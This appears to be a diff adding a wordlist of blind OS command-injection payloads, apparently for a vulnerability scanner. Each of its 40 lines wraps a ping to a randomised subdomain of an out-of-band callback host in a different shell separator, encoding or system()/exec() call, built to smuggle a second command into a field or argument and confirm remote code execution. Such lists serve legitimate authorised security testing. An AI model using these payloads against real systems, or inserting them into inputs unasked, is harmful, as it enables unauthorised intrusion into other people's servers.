@@ -1,0 +1,40 @@
+%0Aping%20rce___RANDOM_STR__.xxx-trulia.com
+%0Aping rce___RANDOM_STR__.xxx-trulia.com
+%0a ping rce___RANDOM_STR__.xxx-trulia.com %0a
+%0Aping rce___RANDOM_STR__.xxx-trulia.com%0A
+|ping rce___RANDOM_STR__.xxx-trulia.com
+;ping rce___RANDOM_STR__.xxx-trulia.com
+;ping rce___RANDOM_STR__.xxx-trulia.com|
+;ping rce___RANDOM_STR__.xxx-trulia.com;
+)|ping rce___RANDOM_STR__.xxx-trulia.com
+)|ping rce___RANDOM_STR__.xxx-trulia.com;
+);ping rce___RANDOM_STR__.xxx-trulia.com
+);ping rce___RANDOM_STR__.xxx-trulia.com|
+);ping rce___RANDOM_STR__.xxx-trulia.com;
+`ping rce___RANDOM_STR__.xxx-trulia.com`
+||ping rce___RANDOM_STR__.xxx-trulia.com|
+||ping rce___RANDOM_STR__.xxx-trulia.com;
+| ping rce___RANDOM_STR__.xxx-trulia.com
+|ping rce___RANDOM_STR__.xxx-trulia.com
+|ping rce___RANDOM_STR__.xxx-trulia.com|
+|ping rce___RANDOM_STR__.xxx-trulia.com;
+;|ping rce___RANDOM_STR__.xxx-trulia.com|
+; ping rce___RANDOM_STR__.xxx-trulia.com
+;ping rce___RANDOM_STR__.xxx-trulia.com
+;ping rce___RANDOM_STR__.xxx-trulia.com|
+;ping rce___RANDOM_STR__.xxx-trulia.com;
+$;ping rce___RANDOM_STR__.xxx-trulia.com
+$(ping rce___RANDOM_STR__.xxx-trulia.com)
+& ping rce___RANDOM_STR__.xxx-trulia.com
+%26 ping rce___RANDOM_STR__.xxx-trulia.com %26
+;ping rce___RANDOM_STR__.xxx-trulia.com\n
+\nping rce___RANDOM_STR__.xxx-trulia.com|
+\nping rce___RANDOM_STR__.xxx-trulia.com;
+|nping rce___RANDOM_STR__.xxx-trulia.com\n
+\nping rce___RANDOM_STR__.xxx-trulia.com\n
+;system('ping rce___RANDOM_STR__.xxx-trulia.com')
+;exec('ping%20rce___RANDOM_STR__.xxx-trulia.com')
+|ping rce___RANDOM_STR__.xxx-trulia.com\n
+`ping rce___RANDOM_STR__.xxx-trulia.com`
+%0aping rce___RANDOM_STR__.xxx-trulia.com%0a
+&ping rce___RANDOM_STR__.xxx-trulia.com&
